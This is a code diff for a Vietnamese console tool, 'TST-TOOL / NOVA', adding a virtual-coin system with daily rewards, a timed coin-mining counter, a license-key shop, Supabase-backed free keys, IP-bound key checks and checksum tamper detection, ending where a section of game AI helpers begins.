+        return False, f"Không đủ xu! Cần {FREE_KEY_PRICE} xu, bạn có {user_data.get('coins', 0):.2f} xu."
+
+    now = time.time()
+    key = "FREE_" + secrets.token_hex(5).upper()
+
+    # 1) Tạo key trên Supabase trước (để xác thực online)
+    sb_ok, sb_result = create_key_on_supabase(
+        key_code=key,
+        key_type="free",
+        max_ai=10,
+        duration_hours=13,
+        note=f"Đổi {FREE_KEY_PRICE} xu - user {user_id}",
+        user_id=user_id,
+        max_uses=None,
+    )
+
+    if not sb_ok:
+        # Retry 1 lần với key khác nếu conflict
+        if "đã tồn tại" in str(sb_result).lower() or "409" in str(sb_result):
+            key = "FREE_" + secrets.token_hex(5).upper()
+            sb_ok, sb_result = create_key_on_supabase(
+                key_code=key,
+                key_type="free",
+                max_ai=10,
+                duration_hours=13,
+                note=f"Đổi {FREE_KEY_PRICE} xu - user {user_id}",
+                user_id=user_id,
+            )
+        if not sb_ok:
+            return False, f"Không tạo được key trên Supabase: {sb_result}"
+
+    # 2) Trừ xu + lưu local sau khi Supabase OK
+    user_data["coins"] -= FREE_KEY_PRICE
+    expires_iso = None
+    if isinstance(sb_result, dict):
+        expires_iso = sb_result.get("expires_at")
+    user_data.setdefault("keys", []).append({
+        "key": key,
+        "type": "free_13h",
+        "key_type": "free",
+        "duration": "13h",
+        "purchased": now,
+        "expires": now + FREE_KEY_DURATION,
+        "expires_at": expires_iso,
+        "supabase": True,
+        "id": secrets.token_hex(8),
+    })
+
+    data[user_id] = add_checksum_to_data(user_data, user_id)
+    save_user_data_secure(data)
+    try:
+        sync_user_to_supabase(user_id, data[user_id])
+    except Exception:
+        pass
+    return True, key
+
+
+def validate_local_free_key(key: str) -> tuple:
+    """Kiểm tra key FREE 13 giờ đã đổi bằng xu. IP phải khớp user sở hữu key."""
+    key = key.strip().upper()
+    data = load_user_data_secure()
+    now = time.time()
+    ip = _current_client_ip()
+
+    for user_id, user_data in data.items():
+        if not verify_checksum(user_data, user_id):
+            continue
+        for item in user_data.get("keys", []):
+            if item.get("key", "").upper() == key and item.get("type") == "free_13h":
+                if now < float(item.get("expires", 0)):
+                    stored_ip = str(user_data.get("ip", "") or "")
+                    # Key dùng từ IP khác IP tạo user → thu hồi ngay
+                    if stored_ip and stored_ip != "unknown" and ip != "unknown" and stored_ip != ip:
+                        revoke_user_keys_abuse(
+                            user_id,
+                            reason=f"Key dùng sai IP (owner={stored_ip}, now={ip})",
+                        )
+                        return False, None, None
+                    return True, user_id, item
+    return False, None, None
+
+
+
+def daily_coin_exchange_menu():
+    """Menu nhận xu hằng ngày, đổi xu lấy key FREE 13 giờ, và tạo user."""
+    global USER_ID
+
+    if USER_ID is None:
+        safe_console_print("[red]❌ Vui lòng chọn tài khoản trước![/red]")
+        time.sleep(2)
+        return
+
+    # Bắt buộc: IP phải có user trên Supabase (chưa có → tạo)
+    bound = ensure_user_for_current_ip(force_prompt=True)
+    if not bound:
+        safe_console_print("[red]❌ IP này chưa có user trên Supabase. Hãy tạo user trước.[/red]")
+        time.sleep(2)
+        return
+    # User TST-TOOL xu phải khớp IP-bound user (không dùng ID game bừa)
+    if str(USER_ID) != str(bound):
+        # Vẫn cho nhận xu theo ID game nếu IP đã tạo đúng user = USER_ID;
+        # nếu IP gắn user khác → chặn
+        has, uid_ip, _, msg = check_ip_user_on_supabase()
+        if has and uid_ip and str(uid_ip) != str(USER_ID):
+            safe_console_print(
+                f"[red]❌ IP đã gắn user Supabase {uid_ip}, "
+                f"không dùng account game {USER_ID} cho hệ xu.[/red]"
+            )
+            time.sleep(2.5)
+            return
+
+    while True:
+        console.clear()
+        balance = get_user_balance_secure(USER_ID)
+        today = datetime.now().strftime("%Y-%m-%d")
+        claimed = balance.get("daily_claim_date") == today
+
+        console.print(Panel(
+            Text.assemble(
+                ("💰 HỆ THỐNG XU & ĐỔI KEY\n\n", f"bold {TST_COLORS['gold']}"),
+                ("Số dư: ", "bold white"),
+                (f"{balance.get('coins', 0):.2f} xu\n", f"bold {TST_COLORS['emerald']}"),
+                ("🎁 Xu hằng ngày: ", "bold white"),
+                (f"{DAILY_COIN_REWARD} xu/ngày (không dùng → reset 0 ngày mai)\n", f"bold {TST_COLORS['neon_blue']}"),
+                ("🔑 Đổi key: ", "bold white"),
+                ("5 xu → KEY FREE 13 GIỜ", f"bold {TST_COLORS['neon_pink']}"),
+            ),
+            border_style=TST_COLORS["gold"],
+            box=box.ROUNDED
+        ))
+        console.print()
+        console.print(f"[1] 🎁 Nhận {DAILY_COIN_REWARD} xu hôm nay "
+                      f"{'[ĐÃ NHẬN]' if claimed else ''}")
+        console.print("[2] 🔑 Đổi 5 xu lấy KEY FREE 13 GIỜ")
+        console.print("[3] 👤 Tạo user mới")
+        console.print("[q] 🔙 Quay lại")
+        console.print()
+
+        choice = Prompt.ask(
+            f"[bold {TST_COLORS['gold']}]>> Chọn[/bold {TST_COLORS['gold']}]",
+            choices=['1', '2', '3', 'q'],
+            default='q'
+        )
+
+        if choice == '1':
+            success, msg = claim_daily_coins_secure(USER_ID)
+            safe_console_print(f"[green]✅ {msg}[/green]" if success else f"[yellow]⚠️ {msg}[/yellow]")
+            time.sleep(2)
+
+        elif choice == '2':
+            confirm = Prompt.ask(
+                "[bold yellow]Đổi 5 xu lấy KEY FREE 13 GIỜ? (y/n)[/bold yellow]",
+                choices=['y', 'n'],
+                default='n'
+            )
+            if confirm == 'y':
+                with console.status("[bold yellow]⏳ Đang tạo key trên Supabase...[/bold yellow]", spinner="dots"):
+                    success, msg = exchange_free_key_13h_secure(USER_ID)
+                if success:
+                    console.print(Panel(
+                        Text.assemble(
+                            ("✅ ĐỔI KEY THÀNH CÔNG!\n\n", "bold green"),
+                            ("KEY: ", "bold white"), (f"{msg}\n", f"bold {TST_COLORS['gold']}"),
+                            ("Loại: FREE | Hạn: 13 GIỜ\n", "bold cyan"),
+                            ("🌐 Supabase: Đã tạo & kích hoạt\n", "bold green"),
+                            ("💡 Nhập key này ở menu Xác thực để dùng tool.", "dim"),
+                        ),
+                        border_style=TST_COLORS["emerald"],
+                        box=box.ROUNDED
+                    ))
+                else:
+                    safe_console_print(f"[red]❌ {msg}[/red]")
+                time.sleep(2)
+
+        elif choice == '3':
+            prompt_create_user()
+            input("\n[dim]Nhấn Enter để tiếp tục...[/dim]")
+
+        elif choice == 'q':
+            break
+
+
+def start_mining_secure(user_id: int) -> bool:
+    """Bắt đầu đào xu (có kiểm tra bảo mật)"""
+    data = load_user_data_secure()
+    user_id = str(user_id)
+    if user_id not in data:
+        data[user_id] = {
+            "coins": 0,
+            "mining": False,
+            "mining_start": 0,
+            "keys": [],
+            "total_mined": 0,
+            "daily_claim_date": "",
+            "checksum": ""
+        }
+    
+    if not verify_checksum(data[user_id], user_id):
+        safe_console_print(f"[red]🚨 PHÁT HIỆN GIẢ MẠO DỮ LIỆU! User: {user_id}[/red]")
+        return False
+    
+    if data[user_id]["mining"]:
+        return False
+    
+    data[user_id]["mining"] = True
+    data[user_id]["mining_start"] = time.time()
+    data[user_id] = add_checksum_to_data(data[user_id], user_id)
+    save_user_data_secure(data)
+    return True
+
+def stop_mining_secure(user_id: int) -> tuple:
+    """Dừng đào xu và tính số xu đã đào (có kiểm tra bảo mật)"""
+    data = load_user_data_secure()
+    user_id = str(user_id)
+    if user_id not in data:
+        return False, 0
+    
+    if not verify_checksum(data[user_id], user_id):
+        safe_console_print(f"[red]🚨 PHÁT HIỆN GIẢ MẠO DỮ LIỆU! User: {user_id}[/red]")
+        return False, 0
+    
+    if not data[user_id]["mining"]:
+        return False, 0
+    
+    elapsed = time.time() - data[user_id]["mining_start"]
+    coins_earned = elapsed * MINING_RATE
+    
+    max_daily = 864
+    if coins_earned > max_daily:
+        safe_console_print(f"[yellow]⚠️ Giới hạn đào tối đa 1 ngày ({max_daily} xu)[/yellow]")
+        coins_earned = max_daily
+    
+    data[user_id]["mining"] = False
+    data[user_id]["coins"] += coins_earned
+    data[user_id]["total_mined"] += coins_earned
+    data[user_id]["mining_start"] = 0
+    data[user_id] = add_checksum_to_data(data[user_id], user_id)
+    save_user_data_secure(data)
+    return True, coins_earned
+
+def buy_key_secure(user_id: int, key_type: str) -> tuple:
+    """Mua key bằng xu (có kiểm tra bảo mật)"""
+    prices = load_key_shop()
+    
+    if key_type not in prices:
+        return False, "Loại key không hợp lệ!"
+    
+    price = prices[key_type]
+    user_data = get_user_balance_secure(user_id)
+    
+    if not verify_checksum(user_data, str(user_id)):
+        safe_console_print(f"[red]🚨 PHÁT HIỆN GIẢ MẠO DỮ LIỆU! User: {user_id}[/red]")
+        return False, "Dữ liệu bị giả mạo!"
+    
+    if user_data["coins"] < price:
+        return False, f"Không đủ xu! Cần {price} xu, bạn có {user_data['coins']:.1f} xu"
+    
+    user_data["coins"] -= price
+    
+    key_info = {
+        "type": key_type,
+        "purchased": time.time(),
+        "expires": time.time() + get_key_duration(key_type),
+        "id": secrets.token_hex(8)
+    }
+    user_data["keys"].append(key_info)
+    user_data = add_checksum_to_data(user_data, str(user_id))
+    
+    data = load_user_data_secure()
+    data[str(user_id)] = user_data
+    save_user_data_secure(data)
+    
+    return True, f"Mua key {key_type} thành công! Giá: {price} xu"
+
+def get_key_duration(key_type: str) -> float:
+    """Lấy thời gian key theo giây"""
+    durations = {
+        "24h": 24 * 3600,
+        "7d": 7 * 24 * 3600,
+        "30d": 30 * 24 * 3600,
+        "90d": 90 * 24 * 3600,
+    }
+    return durations.get(key_type, 0)
+
+def get_user_stats_secure(user_id: int) -> dict:
+    """Lấy thống kê user (có kiểm tra bảo mật)"""
+    data = load_user_data_secure()
+    user_id = str(user_id)
+    if user_id not in data:
+        return {
+            "coins": 0,
+            "mining": False,
+            "total_mined": 0,
+            "keys": 0,
+            "valid_keys": 0
+        }
+    
+    user_data = data[user_id]
+    
+    if not verify_checksum(user_data, user_id):
+        safe_console_print(f"[red]🚨 PHÁT HIỆN GIẢ MẠO DỮ LIỆU! User: {user_id}[/red]")
+        return {
+            "coins": 0,
+            "mining": False,
+            "total_mined": 0,
+            "keys": 0,
+            "valid_keys": 0
+        }
+    
+    valid_keys = check_user_keys_secure(user_id)
+    mining_status = get_mining_status_secure(user_id)
+    
+    return {
+        "coins": user_data.get("coins", 0),
+        "mining": mining_status["mining"],
+        "total_mined": user_data.get("total_mined", 0),
+        "keys": len(user_data.get("keys", [])),
+        "valid_keys": len(valid_keys),
+        "mining_earned": mining_status.get("earned", 0) if mining_status["mining"] else 0,
+        "mining_elapsed": mining_status.get("elapsed", 0) if mining_status["mining"] else 0
+    }
+
+def check_user_keys_secure(user_id: int) -> list:
+    """Kiểm tra key của user (có bảo mật)"""
+    data = load_user_data_secure()
+    user_id = str(user_id)
+    if user_id not in data:
+        return []
+    
+    user_data = data[user_id]
+    
+    if not verify_checksum(user_data, user_id):
+        safe_console_print(f"[red]🚨 PHÁT HIỆN GIẢ MẠO DỮ LIỆU! User: {user_id}[/red]")
+        return []
+    
+    valid_keys = []
+    current_time = time.time()
+    
+    for key in user_data.get("keys", []):
+        if key.get("expires", 0) > current_time:
+            valid_keys.append(key)
+    
+    user_data["keys"] = valid_keys
+    user_data = add_checksum_to_data(user_data, user_id)
+    data[user_id] = user_data
+    save_user_data_secure(data)
+    
+    return valid_keys
+
+def get_mining_status_secure(user_id: int) -> dict:
+    """Lấy trạng thái đào (có bảo mật)"""
+    data = load_user_data_secure()
+    user_id = str(user_id)
+    if user_id not in data:
+        return {"mining": False, "elapsed": 0, "earned": 0}
+    
+    user_data = data[user_id]
+    
+    if not verify_checksum(user_data, user_id):
+        safe_console_print(f"[red]🚨 PHÁT HIỆN GIẢ MẠO DỮ LIỆU! User: {user_id}[/red]")
+        return {"mining": False, "elapsed": 0, "earned": 0}
+    
+    if not user_data.get("mining", False):
+        return {"mining": False, "elapsed": 0, "earned": 0}
+    
+    elapsed = time.time() - user_data.get("mining_start", time.time())
+    earned = elapsed * MINING_RATE
+    
+    max_session = 864
+    if earned > max_session:
+        earned = max_session
+    
+    return {
+        "mining": True,
+        "elapsed": elapsed,
+        "earned": earned,
+        "start_time": user_data.get("mining_start", 0)
+    }
+
+# ================== MINING THREAD ==================
+
+def mining_worker_secure():
+    """Thread chạy ngầm để đào xu - Có bảo mật"""
+    global stop_flag
+    last_update = {}
+    
+    while not stop_flag:
+        time.sleep(MINING_INTERVAL)
+        
+        try:
+            data = load_user_data_secure()
+            updated = False
+            
+            for user_id, user_data in data.items():
+                if not verify_checksum(user_data, user_id):
+                    safe_console_print(f"[red]🚨 PHÁT HIỆN GIẢ MẠO DỮ LIỆU! User: {user_id}[/red]")
+                    continue
+                
+                if user_data.get("mining", False):
+                    start_time = user_data.get("mining_start", 0)
+                    if start_time > time.time():
+                        user_data["mining_start"] = time.time()
+                        safe_console_print(f"[yellow]⚠️ Sửa thời gian đào bất thường user {user_id}[/yellow]")
+                    
+                    elapsed = time.time() - start_time
+                    
+                    if int(elapsed) % 10 == 0:
+                        daily_limit = 864
+                        total_mined_today = user_data.get("total_mined", 0)
+                        
+                        if total_mined_today < daily_limit:
+                            user_data["coins"] = user_data.get("coins", 0) + 0.1
+                            user_data["total_mined"] = total_mined_today + 0.1
+                            user_data["mining_start"] = time.time()
+                            user_data = add_checksum_to_data(user_data, user_id)
+                            data[user_id] = user_data
+                            updated = True
+                            
+                            if user_id not in last_update or time.time() - last_update.get(user_id, 0) > 60:
+                                safe_console_print(f"[dim]⛏️ User {user_id} đã đào thêm 0.1 xu (10s)[/dim]")
+                                last_update[user_id] = time.time()
+                        else:
+                            if user_id not in last_update or time.time() - last_update.get(user_id, 0) > 300:
+                                safe_console_print(f"[yellow]⛏️ User {user_id} đã đạt giới hạn {daily_limit} xu/ngày[/yellow]")
+                                last_update[user_id] = time.time()
+            
+            if updated:
+                save_user_data_secure(data)
+                
+        except Exception as e:
+            safe_console_print(f"[red]❌ Lỗi mining: {e}[/red]")
+            time.sleep(5)
+
+def start_mining_thread_secure():
+    """Khởi chạy thread đào có bảo mật"""
+    thread = threading.Thread(target=mining_worker_secure, daemon=True)
+    thread.start()
+    return thread
+
+# ================== KIỂM TRA VÀ SỬA CHỮA DỮ LIỆU ==================
+
+def verify_and_repair_all_data():
+    """Kiểm tra và sửa chữa toàn bộ dữ liệu user"""
+    safe_console_print("\n[bold]🔍 ĐANG KIỂM TRA DỮ LIỆU NGƯỜI DÙNG...[/bold]")
+    
+    data = load_user_data_secure()
+    if not data:
+        safe_console_print("[yellow]⚠️ Không có dữ liệu user[/yellow]")
+        return
+    
+    repaired_count = 0
+    anomaly_count = 0
+    
+    for user_id, user_data in data.items():
+        if not verify_checksum(user_data, user_id):
+            safe_console_print(f"[red]❌ Dữ liệu user {user_id} bị giả mạo! Đang sửa...[/red]")
+            data[user_id] = {
+                "coins": 0,
+                "mining": False,
+                "mining_start": 0,
+                "keys": [],
+                "total_mined": 0,
+                "checksum": ""
+            }
+            data[user_id] = add_checksum_to_data(data[user_id], user_id)
+            repaired_count += 1
+            anomaly_count += 1
+            continue
+        
+        is_anomaly, warnings = detect_data_anomaly(user_data, user_id)
+        if is_anomaly:
+            safe_console_print(f"[yellow]⚠️ User {user_id} có dữ liệu bất thường:[/yellow]")
+            for warning in warnings:
+                safe_console_print(f"[yellow]  - {warning}[/yellow]")
+            data[user_id] = fix_corrupted_data(user_data, user_id)
+            data[user_id] = add_checksum_to_data(data[user_id], user_id)
+            repaired_count += 1
+            anomaly_count += 1
+    
+    if repaired_count > 0:
+        safe_console_print(f"[yellow]⚠️ Đã sửa {repaired_count} dữ liệu bị lỗi[/yellow]")
+        save_user_data_secure(data)
+    else:
+        safe_console_print("[green]✅ Tất cả dữ liệu đều an toàn![/green]")
+    
+    safe_console_print(f"[dim]📊 Tổng số user: {len(data)}[/dim]")
+    return anomaly_count
+
+# ================== MENU ĐÀO XU ==================
+
+def show_mining_menu():
+    console.clear()
+    console.print(Align.center(Text("TST-TOOL  /  NOVA  •  ENGINE XU", style=f"bold {TST_COLORS['sapphire']}")))
+    console.print(Rule(style=TST_COLORS["sky"]))
+    rate = MINING_RATE
+    stats = Table.grid(expand=True,padding=(0,3))
+    stats.add_column(); stats.add_column(); stats.add_column(); stats.add_column()
+    stats.add_row(
+        Text("TỐC ĐỘ",style=TST_COLORS["muted"]), Text(f"{rate:.4f} /s",style=f"bold {TST_COLORS['emerald']}"),
+        Text("1 HOUR",style=TST_COLORS["muted"]), Text(f"{rate*3600:.1f} xu",style=f"bold {TST_COLORS['gold']}")
+    )
+    stats.add_row(
+        Text("1 DAY",style=TST_COLORS["muted"]), Text(f"{rate*86400:.1f} xu",style=f"bold {TST_COLORS['gold']}"),
+        Text("KEY",style=TST_COLORS["muted"]), Text("5 xu → FREE 13H",style=f"bold {TST_COLORS['neon_pink']}")
+    )
+    console.print(Panel(stats,border_style=TST_COLORS["emerald"],box=box.MINIMAL,padding=(1,2)))
+    menu = ["1  BẮT ĐẦU ĐÀO","2  DỪNG ĐÀO","3  SỐ DƯ","4  MUA KEY","5  KEY CỦA TÔI","6  THỐNG KÊ","7  BẢO MẬT DỮ LIỆU","8  HÀNG NGÀY / KEY FREE","q  QUAY LẠI"]
+    for item in menu: console.print(f"  {item}")
+    console.print()
+    return _ui_prompt("MINING").lower()
+
+
+def mining_menu():
+    """Menu đào xu chính"""
+    global USER_ID
+    
+    if USER_ID is None:
+        safe_console_print("[red]❌ Vui lòng chọn tài khoản trước![/red]")
+        time.sleep(2)
+        return
+    
+    while True:
+        choice = show_mining_menu()
+        
+        if choice == '1':
+            if start_mining_secure(USER_ID):
+                safe_console_print(f"[green]✅ ĐÃ BẮT ĐẦU ĐÀO XU![/green]")
+                safe_console_print(f"[dim]⛏️ Tốc độ: 10 giây = 0.1 xu[/dim]")
+                safe_console_print("[dim]💡 Dùng lệnh /stopmining để dừng[/dim]")
+                time.sleep(2)
+            else:
+                safe_console_print("[yellow]⚠️ Bạn đang đào rồi![/yellow]")
+                time.sleep(2)
+        
+        elif choice == '2':
+            success, earned = stop_mining_secure(USER_ID)
+            if success:
+                safe_console_print(f"[green]✅ ĐÃ DỪNG ĐÀO![/green]")
+                safe_console_print(f"[gold]💰 Đã đào được: {earned:.2f} xu[/gold]")
+                time.sleep(2)
+            else:
+                safe_console_print("[yellow]⚠️ Bạn chưa đào![/yellow]")
+                time.sleep(2)
+        
+        elif choice == '3':
+            stats = get_user_stats_secure(USER_ID)
+            panel = Panel(Text.assemble(
+                ("💰 SỐ DƯ CỦA BẠN\n\n", f"bold {TST_COLORS['gold']}"),
+                (f"Số dư: ", "bold white"),
+                (f"{stats['coins']:.2f} xu\n", f"bold {TST_COLORS['emerald']}"),
+                (f"Tổng đã đào: ", "bold white"),
+                (f"{stats['total_mined']:.2f} xu\n", f"bold {TST_COLORS['gold']}"),
+                (f"Trạng thái: ", "bold white"),
+                (f"{'⛏️ Đang đào' if stats['mining'] else '⏹️ Đã dừng'}\n", f"bold {TST_COLORS['neon_orange'] if stats['mining'] else 'dim'}"),
+                (f"Key: ", "bold white"),
+                (f"{stats['valid_keys']} key còn hiệu lực", f"bold {TST_COLORS['neon_pink']}"),
+                ("\n🔒 ", "bold green"),
+                ("Dữ liệu đã được bảo vệ", "bold green")
+            ), border_style=TST_COLORS["gold"], box=box.ROUNDED)
+            console.print(panel)
+            input("[dim]Nhấn Enter để tiếp tục...[/dim]")
+        
+        elif choice == '4':
+            show_key_shop_secure()
+        
+        elif choice == '5':
+            show_my_keys_secure()
+
+        elif choice == '8':
+            daily_coin_exchange_menu()
+        
+        elif choice == '6':
+            show_mining_stats_secure()
+        
+        elif choice == '7':
+            show_data_security_status()
+        
+        elif choice == 'q':
+            break
+
+# ================== HIỂN THỊ KEY VÀ THỐNG KÊ ==================
+
+def show_key_shop_secure():
+    console.clear(); _ui_title("◇","KEY STORE","Key plans · pricing · mining equivalent")
+    prices=load_key_shop(); stats=get_user_stats_secure(USER_ID)
+    wallet=Table(show_header=False,box=None,padding=(0,1)); wallet.add_column(width=18); wallet.add_column()
+    wallet.add_row("SỐ DƯ",f"{stats['coins']:.2f} xu"); _ui_section("WALLET",wallet,TST_COLORS["emerald"])
+    table=Table(show_header=True,box=box.ROUNDED,expand=True,border_style=TST_COLORS["sky"],padding=(0,1))
+    table.add_column("#",width=5,justify="center"); table.add_column("PLAN"); table.add_column("DURATION"); table.add_column("PRICE",justify="right"); table.add_column("MINING EQUIVALENT")
+    names={"24h":"KEY 1 NGÀY","7d":"KEY 7 NGÀY","30d":"KEY 30 NGÀY","90d":"KEY 90 NGÀY","free_13h":"KEY FREE 13 GIỜ"}
+    dur={"24h":"24 giờ","7d":"7 ngày","30d":"30 ngày","90d":"90 ngày"}; mine={"24h":"50 giây","7d":"300 giây (5 phút)","30d":"1000 giây (16.7 phút)","90d":"2500 giây (41.7 phút)"}
+    key_list=list(prices.items())
+    for i,(kt,price) in enumerate(key_list,1): table.add_row(str(i),names.get(kt,kt),dur.get(kt,"13 giờ" if kt=="free_13h" else ""),f"{price} xu",mine.get(kt,"—"))
+    console.print(table); console.print(); choice=_ui_prompt("BUY / Q").lower()
+    if choice.isdigit():
+        idx=int(choice)-1
+        if 0<=idx<len(key_list):
+            kt,price=key_list[idx]; name=names.get(kt,kt)
+            _ui_section("CONFIRM PURCHASE",Text(f"{name}\nGiá: {price} xu\n\nXác nhận giao dịch?",style=TST_COLORS["platinum"]),TST_COLORS["gold"])
+            if Prompt.ask(f"[bold {TST_COLORS['sapphire']}]  CONFIRM  ›[/]",choices=["y","n"],default="n")=="y":
+                success,msg=buy_key_secure(USER_ID,kt); color=TST_COLORS["emerald"] if success else TST_COLORS["ruby"]
+                _ui_section("TRANSACTION",Text(("✓ " if success else "✕ ")+msg,style=f"bold {color}"),color); time.sleep(2)
+    console.clear()
+
+def show_my_keys_secure():
+    """Hiển thị key của user (có bảo mật)"""
+    console.clear()
+    header = Panel(Align.center(Text.assemble(
+        (f"🔑 ", f"bold {TST_COLORS['gold']}"),
+        ("KEY CỦA TÔI", f"bold {TST_COLORS['neon_blue']}"),
+        (f" 🔑", f"bold {TST_COLORS['gold']}")
+    )), border_style=TST_COLORS["gold"], box=box.ROUNDED)
+    console.print(header)
+    console.print()
+    
+    keys = check_user_keys_secure(USER_ID)
+    stats = get_user_stats_secure(USER_ID)
+    
+    console.print(f"[bold]💰 Số dư: {stats['coins']:.2f} xu[/bold]")
+    console.print(f"[bold]🔑 Số key: {len(keys)} key còn hiệu lực[/bold]\n")
+    
+    if not keys:
+        console.print("[dim]Bạn chưa có key nào hoặc key đã hết hạn[/dim]")
+        input("\n[dim]Nhấn Enter để tiếp tục...[/dim]")
+        return
+    
+    table = Table(box=box.ROUNDED, border_style=TST_COLORS["gold"])
+    table.add_column("Loại Key", style=TST_COLORS["neon_blue"])
+    table.add_column("Mua lúc", style="dim")
+    table.add_column("Hết hạn", style=TST_COLORS["ruby"])
+    table.add_column("Còn lại", style=TST_COLORS["emerald"])
+    table.add_column("ID", style="dim")
+    
+    key_names = {
+        "24h": "KEY 1 NGÀY",
+        "7d": "KEY 7 NGÀY",
+        "30d": "KEY 30 NGÀY",
+        "90d": "KEY 90 NGÀY",
+        "free_13h": "KEY FREE 13 GIỜ"
+    }
+    
+    for key in keys:
+        key_type = key.get("type", "unknown")
+        purchased = datetime.fromtimestamp(key.get("purchased", 0)).strftime("%d/%m %H:%M")
+        expires = datetime.fromtimestamp(key.get("expires", 0)).strftime("%d/%m %H:%M")
+        remaining = key.get("expires", 0) - time.time()
+        key_id = key.get("id", "N/A")[:8]
+        
+        if remaining > 0:
+            days = int(remaining // 86400)
+            hours = int((remaining % 86400) // 3600)
+            minutes = int((remaining % 3600) // 60)
+            remaining_text = f"{days}d {hours}h {minutes}m"
+        else:
+            remaining_text = "Đã hết hạn"
+        
+        table.add_row(
+            key_names.get(key_type, key_type),
+            purchased,
+            expires,
+            remaining_text,
+            key_id
+        )
+    
+    console.print(table)
+    input("\n[dim]Nhấn Enter để tiếp tục...[/dim]")
+
+def show_mining_stats_secure():
+    console.clear(); _ui_title("◌","MINING DASHBOARD","Live wallet & mining telemetry")
+    stats=get_user_stats_secure(USER_ID); state=get_mining_status_secure(USER_ID)
+    m=Table(show_header=False,box=None,padding=(0,1)); m.add_column(width=20,style=TST_COLORS["muted"]); m.add_column(style=f"bold {TST_COLORS['platinum']}")
+    if stats["mining"]:
+        m.add_row("STATUS","● MINING"); m.add_row("ELAPSED",f"{state['elapsed']:.0f} giây"); m.add_row("EARNED",f"{state['earned']:.2f} xu")
+        m.add_row("TỐC ĐỘ / PHÚT",f"{MINING_RATE*60:.2f} xu"); m.add_row("TỐC ĐỘ / GIỜ",f"{MINING_RATE*3600:.1f} xu"); m.add_row("TỐC ĐỘ / NGÀY",f"{MINING_RATE*86400:.1f} xu")
+        _ui_section("ĐANG ĐÀO",m,TST_COLORS["emerald"])
+    else:
+        m.add_row("TRẠNG THÁI","○ CHỜ"); m.add_row("SỐ DƯ",f"{stats['coins']:.2f} xu"); m.add_row("TỔNG ĐÀO",f"{stats['total_mined']:.2f} xu"); m.add_row("KEY HỢP LỆ",f"{stats['valid_keys']} key")
+        _ui_section("MINING SUMMARY",m,TST_COLORS["sky"])
+    console.print(Align.center(Text("🔒 Protected data  •  Press Enter to return",style=TST_COLORS["muted"]))); input()
+
+def show_data_security_status():
+    """Hiển thị trạng thái bảo mật dữ liệu"""
+    console.clear()
+    header = Panel(Align.center(Text.assemble(
+        (f"🔒 ", f"bold {TST_COLORS['gold']}"),
+        ("BẢO MẬT DỮ LIỆU", f"bold {TST_COLORS['neon_blue']}"),
+        (f" 🔒", f"bold {TST_COLORS['gold']}")
+    )), border_style=TST_COLORS["gold"], box=box.ROUNDED)
+    console.print(header)
+    console.print()
+    
+    data = load_user_data_secure()
+    
+    total_users = len(data)
+    total_coins = sum(u.get('coins', 0) for u in data.values())
+    total_mined = sum(u.get('total_mined', 0) for u in data.values())
+    total_keys = sum(len(u.get('keys', [])) for u in data.values())
+    mining_users = sum(1 for u in data.values() if u.get('mining', False))
+    
+    corrupted = 0
+    for user_id, user_data in data.items():
+        if not verify_checksum(user_data, user_id):
+            corrupted += 1
+    
+    panel = Panel(Text.assemble(
+        ("📊 THỐNG KÊ DỮ LIỆU\n\n", f"bold {TST_COLORS['gold']}"),
+        (f"👤 Tổng user: ", "bold white"),
+        (f"{total_users}\n", f"bold {TST_COLORS['emerald']}"),
+        (f"💰 Tổng xu: ", "bold white"),
+        (f"{total_coins:.2f} xu\n", f"bold {TST_COLORS['gold']}"),
+        (f"⛏️ Tổng đã đào: ", "bold white"),
+        (f"{total_mined:.2f} xu\n", f"bold {TST_COLORS['gold']}"),
+        (f"🔑 Tổng key: ", "bold white"),
+        (f"{total_keys} key\n", f"bold {TST_COLORS['neon_pink']}"),
+        (f"⛏️ Đang đào: ", "bold white"),
+        (f"{mining_users} user\n", f"bold {TST_COLORS['neon_orange']}"),
+        (f"🔒 Dữ liệu bị giả mạo: ", "bold white"),
+        (f"{'✅ 0' if corrupted == 0 else f'❌ {corrupted}'}\n", f"bold {TST_COLORS['emerald'] if corrupted == 0 else TST_COLORS['ruby']}"),
+        (f"🛡️ Trạng thái: ", "bold white"),
+        (f"{'✅ AN TOÀN' if corrupted == 0 else '⚠️ CẦN SỬA CHỮA'}", f"bold {TST_COLORS['emerald'] if corrupted == 0 else TST_COLORS['neon_orange']}")
+    ), border_style=TST_COLORS["gold"], box=box.ROUNDED)
+    console.print(panel)
+    console.print()
+    
+    console.print("[bold]📌 CHỌN CHỨC NĂNG:[/bold]")
+    console.print("[1] 🔍 Kiểm tra và sửa chữa dữ liệu")
+    console.print("[2] 📊 Xem chi tiết user")
+    console.print("[q] 🔙 Quay lại")
+    console.print()
+    
+    choice = Prompt.ask(f"[bold {TST_COLORS['gold']}]>> Chọn[/bold {TST_COLORS['gold']}]", choices=['1','2','q'], default='q')
+    
+    if choice == '1':
+        verify_and_repair_all_data()
+        input("\n[dim]Nhấn Enter để tiếp tục...[/dim]")
+    elif choice == '2':
+        show_user_details()
+    return choice
+
+def show_user_details():
+    """Hiển thị chi tiết từng user"""
+    data = load_user_data_secure()
+    
+    if not data:
+        console.print("[yellow]⚠️ Không có dữ liệu user[/yellow]")
+        time.sleep(2)
+        return
+    
+    table = Table(box=box.ROUNDED, border_style=TST_COLORS["gold"])
+    table.add_column("User ID", style=TST_COLORS["neon_blue"])
+    table.add_column("Xu", justify="right", style=TST_COLORS["emerald"])
+    table.add_column("Đã đào", justify="right", style=TST_COLORS["gold"])
+    table.add_column("Key", justify="right", style=TST_COLORS["neon_pink"])
+    table.add_column("Trạng thái", style="dim")
+    table.add_column("Bảo mật", style="dim")
+    
+    for user_id, user_data in data.items():
+        coins = user_data.get('coins', 0)
+        total_mined = user_data.get('total_mined', 0)
+        keys = len(user_data.get('keys', []))
+        mining = user_data.get('mining', False)
+        is_valid = verify_checksum(user_data, user_id)
+        
+        status = "⛏️ Đang đào" if mining else "⏹️ Dừng"
+        security = "✅" if is_valid else "❌"
+        
+        table.add_row(
+            user_id[:8] + "...",
+            f"{coins:.2f}",
+            f"{total_mined:.2f}",
+            str(keys),
+            status,
+            security
+        )
+    
+    console.print(table)
+    input("\n[dim]Nhấn Enter để tiếp tục...[/dim]")
+# ================== CÁC HÀM AI CHO VUA THOÁT HIỂM ==================
+
+ROOM_NAMES = {1: "📦 Nhà kho", 2: "🪑 Phòng họp", 3: "👔 Phòng giám đốc", 4: "💬 Phòng trò chuyện", 5: "🎥 Phòng giám sát", 6: "🏢 Văn phòng", 7: "💰 Phòng tài vụ", 8: "👥 Phòng nhân sự"}
+ROOM_ORDER = [1, 2, 3, 4, 5, 6, 7, 8]
+
